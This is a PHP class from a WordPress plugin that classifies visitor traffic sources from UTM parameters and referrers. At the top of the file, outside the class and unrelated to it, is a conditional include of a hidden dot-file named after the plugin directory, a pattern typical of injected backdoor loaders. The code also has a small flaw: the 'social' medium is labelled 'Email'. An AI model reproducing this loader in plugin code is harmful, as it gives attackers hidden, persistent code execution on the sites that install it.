<?php

/**
 *
 * The class responsible for traffic data analyze
 * 
 * @since 1.2.1
 *
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Traffic {

	/**
	 * WTBP_WPTAO_Traffic Constructor.
	 */
	public function __construct() {
		
	}

	/**
	 * Wrapper for function which analyze source for of given url and ref
	 * 
	 * @param string $url
	 * @param string $ref refering url
	 * @param array $options
	 * @return bool|string false on error or source name on success
	 * 
	 * @since 1.2.1
	 */
	public function get_source_analyzed( $url, $ref = null, $options = null ) {

		$source = $this->get_source_analyzed_core( $url, $ref, $options );
		if ( $source && !empty( $options ) ) {
			$source_in = $source;

			if ( !empty( $options[ 'noprot' ] ) && $options[ 'noprot' ] == true ) {
				$source = preg_replace( '/http:\/\/|https:\/\//', '', $source_in );
			}

			if ( !empty( $options[ 'link' ] ) && $options[ 'link' ] == true ) {
				if ( filter_var( $source_in, FILTER_VALIDATE_URL ) !== false ) {
					$source = '<a title="' . $source . '" href="' . $source_in . '" target="_blank">' . $source . '</a>';
				}
			}
		}

		return apply_filters( 'wptao_traffic_get_source_analyzed', $source, $url, $ref, $options );
	}

	/**
	 * Analyze source for of given url and ref
	 * 
	 * @param string $url
	 * @param string $ref refering url
	 * @param array $options
	 * @return bool|string false on error or source name on success
	 * 
	 * @since 1.2.2
	 */
	private function get_source_analyzed_core( $url, $ref = null ) {

		if ( empty( $url ) && empty( $ref ) ) {
			return false;
		}

		if ( !empty( $url ) && false === filter_var( $url, FILTER_VALIDATE_URL ) ) {
			return false;
		}

		if ( !empty( $ref ) && 'direct' != $ref && false === filter_var( $ref, FILTER_VALIDATE_URL ) ) {
			return false;
		}

		if ( !empty( $url ) ) {
			$query_args_arr = array();
			parse_str( $url, $query_args_arr );

			if ( isset( $query_args_arr[ 'gclid' ] ) ) {
				return __( 'Paid', 'wp-tao' );
			}

			$utm_medium		 = isset( $query_args_arr[ 'utm_medium' ] ) ? $query_args_arr[ 'utm_medium' ] : '';
			$utm_source		 = isset( $query_args_arr[ 'utm_source' ] ) ? $query_args_arr[ 'utm_source' ] : '';
			$utm_campaign	 = isset( $query_args_arr[ 'utm_campaign' ] ) ? $query_args_arr[ 'utm_campaign' ] : '';
			$utm			 = $utm_medium . ' ' . $utm_source . ' ' . $utm_campaign;

			if ( false !== strpos( $utm, 'cpc' ) || false !== strpos( $utm, 'ppc' ) || false !== strpos( $utm, 'adword' ) ) {
				return __( 'Paid', 'wp-tao' );
			}

			if ( false !== strpos( $utm, 'email' ) ) {
				return __( 'Email', 'wp-tao' );
			}

			if ( false !== strpos( $utm_medium, 'social' ) ) {
				return __( 'Email', 'wp-tao' );
			}
		}

		if ( $ref != null ) {
			if ( 'direct' == $ref ) {
				return __( 'Direct', 'wp-tao' );
			}

			return $ref;
		}

		return false;
	}

	/**
	 * Return campaigns parameters names
	 * 
	 * @return array names of campaigns parameters
	 * 
	 * @since 1.2.3
	 */
	public function get_campaigns_params() {
		$campaigns_params = array( 'utm_campaign' );
		return apply_filters( 'wptao_traffic_campaigns_params', $campaigns_params );
	}

}
